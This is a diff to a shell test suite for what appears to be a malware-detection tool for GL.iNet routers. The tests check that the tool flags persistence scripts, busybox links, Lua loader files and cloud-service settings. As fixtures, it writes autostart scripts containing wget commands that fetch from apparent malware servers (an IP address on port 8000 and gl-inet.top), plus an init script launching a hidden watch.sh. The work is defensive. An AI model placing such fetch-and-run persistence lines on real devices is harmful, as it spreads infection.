@@ -404,7 +404,7 @@ umount "$D/m"
 echo "=== smaller gaps (issue 10)"
 D=$(mkscen gaps "$OWO"); U=$D/u
 mkdir -p "$U/usr/bin" "$U/etc/udhcpc.user.d" "$U/etc/init.d" "$U/etc/config" "$U/bin" "$U/etc/hotplug.d/iface"
-ln -s /bin/busybox "$U/usr/bin/netstat"
+ln -s /bin/busybox "$U/usr/bin/netstat"; ln -s /bin/busybox "$U/usr/bin/mytool"
 printf '#!/bin/sh\necho hi\n' >"$U/etc/udhcpc.user.d/10-mine"
 printf '#!/bin/sh\n/etc/glinet/.cache/watch.sh &\n' >"$U/etc/init.d/S99w"
 printf '#!/bin/sh\nwget http://66.245.219.252:8000/ni.sh\n' >"$U/etc/hotplug.d/iface/99-x"
@@ -417,12 +417,14 @@ printf '#!/bin/sh\nwget http://gl-inet.top:8899/api/v2/sync\n' >"$U/etc/init.d/S
 mkdir -p "$U/usr/lib/opkg"; printf 'Package: gl-sdk4-cloud\nVersion: 1.2.3-4\n\nPackage: other\nVersion: 9\n' >"$U/usr/lib/opkg/status"
 mnt "$D" "$OWO"
 run "$D" "$OWO" --check >"$D/check.txt"; rc=$?
-expect "a new netstat link that the firmware does not have = REVIEW" 'grep -A1 "REVIEW  *new-link  */usr/bin/netstat" "$D/check.txt" | grep -q "busybox"'
+expect "a netstat link to busybox made since the attack = IOC installer-trace" 'grep -A1 "IOC  *installer-trace  */usr/bin/netstat" "$D/check.txt" | grep -q "link to busybox made on 20"'
+expect "another new link that the firmware does not have = REVIEW" 'grep -A1 "REVIEW  *new-link  */usr/bin/mytool" "$D/check.txt" | grep -q "busybox"'
 expect "a script in udhcpc.user.d = REVIEW" 'grep -q "REVIEW  *new  */etc/udhcpc.user.d/10-mine" "$D/check.txt"'
 expect "an init script that starts watch.sh = IOC persist-ref" 'grep -q "IOC  *persist-ref  */etc/init.d/S99w" "$D/check.txt"'
 expect "an autostart file with a server of the malware = IOC persist-ref" 'grep -A1 "IOC  *persist-ref  */etc/hotplug.d/iface/99-x" "$D/check.txt" | grep -q "66.245.219.252"'
 expect "the loader is recognised by its function names" 'grep -A1 "IOC  *backdoor-file  */bin/ulogd" "$D/check.txt" | grep -q "compiled Lua.*function names of the analysed loader"'
 expect "GoodCloud state, client version, binding and remote access are printed" 'grep -q "GoodCloud now  *on (gl-sdk4-cloud 1.2.3-4), bound to an account: on, remote SSH: on, remote web: off" "$D/check.txt"'
+expect "with GoodCloud on, the run ends with the advice to switch it off and the command" 'grep -q "Switch GoodCloud and AstroWarp off now" "$D/check.txt" && grep -q "GoodCloud is ON on this device" "$D/check.txt" && grep -q "uci set .gl-cloud.@cloud\[0\].enable=0." "$D/check.txt"'
 expect "the account's address is not printed anywhere" '! grep -q "someone@example" "$D/check.txt"'
 expect "compiled Lua elsewhere in the overlay: the loader by its names is IOC, other bytecode REVIEW" 'grep -q "IOC  *backdoor-file  */usr/lib/hidden-loader" "$D/check.txt" && grep -q "REVIEW  *lua-bytecode  */usr/lib/other.luac" "$D/check.txt" && ! grep -q "lua-bytecode.*plain.txt" "$D/check.txt"'
 expect "gl-inet.top in an autostart file is an indicator" 'grep -A1 "IOC  *persist-ref  */etc/init.d/S98top" "$D/check.txt" | grep -q "gl-inet.top"'
@@ -479,6 +481,30 @@ expect "a compressed build with the updater's traces is INFO" 'grep -A1 "INFO  *
 printf 'ELF something else\n' >"$D/m/usr/sbin/tailscaled"
 run "$D" "$OWS" --check >"$D/check.txt"
 expect "another program at that path is not waved through" 'grep -q "REVIEW  *modified-binary  */usr/sbin/tailscaled" "$D/check.txt" && ! grep -q "updater-file" "$D/check.txt"'
+umount "$D/m"
+
+echo "=== fixes from the reports: KVM netstat link alone, Tailscale in /usr/bin, linked rc.local, WireGuard timing"
+OWK=$BASE/kvm-like
+cp -a "$OWL" "$OWK"; mkdir -p "$OWK/usr/bin" "$OWK/etc/defaults"; ln -s busybox "$OWK/usr/bin/netstat" 2>/dev/null; echo stock >"$OWK/usr/bin/tailscaled"
+printf '# stock\nexit 0\n' >"$OWK/etc/defaults/rc.local"; rm -f "$OWK/etc/rc.local"; ln -s defaults/rc.local "$OWK/etc/rc.local"
+D=$(mkscen kvmfix "$OWK"); U=$D/u
+mnt "$D" "$OWK"
+rm "$D/m/usr/bin/netstat"; ln -s /bin/busybox "$D/m/usr/bin/netstat"
+printf 'ELF 1.104.7-tiny.by.admon.1463\n' >"$D/m/usr/bin/tailscaled"
+run "$D" "$OWK" --check >"$D/check.txt"; rc=$?
+expect "where GoodCloud cannot be read the advice is given all the same" 'grep -q "Switch GoodCloud and AstroWarp off now" "$D/check.txt" && grep -q "could not be read" "$D/check.txt"'
+expect "the netstat link alone: IOC, verdict ATTACKED by the installer, exit 1" '[ $rc = 1 ] && grep -q "IOC  *installer-trace  */usr/bin/netstat" "$D/check.txt" && grep -q "Verdict: ATTACKED - the malware.s installer" "$D/check.txt"'
+expect "the updater's Tailscale in /usr/bin is waved through" 'grep -q "INFO  *updater-file  */usr/bin/tailscaled" "$D/check.txt"'
+expect "an rc.local that is a link to a regular file is not called odd" '! grep -q "odd-file" "$D/check.txt"'
+run "$D" "$OWK" --fix >"$D/fix.txt"; rc=$?
+expect "--fix leaves the link and exits 1" '[ $rc = 1 ] && [ -L "$D/m/usr/bin/netstat" ]'
+umount "$D/m"
+D=$(mkscen wg "$OWL"); U=$D/u
+mkdir -p "$U/bin" "$U/etc/config"; printf '\033LuaQ loader\n' >"$U/bin/ulogd"; echo cfg >"$U/etc/config/wireguard_server"
+touch -d '2025-12-19 21:07:07 UTC' "$U/bin/ulogd"; touch -d '2025-12-19 21:07:18 UTC' "$U/etc/config/wireguard_server"
+mnt "$D" "$OWL"
+run "$D" "$OWL" --check >"$D/check.txt"
+expect "WireGuard server config written seconds after the loader is noted" 'grep -A1 "REVIEW  *backdoor-wg  */etc/config/wireguard_server" "$D/check.txt" | grep -q "written 11 s after"'
 umount "$D/m"
 
 echo; echo "RESULT: $pass passed, $fail failed"
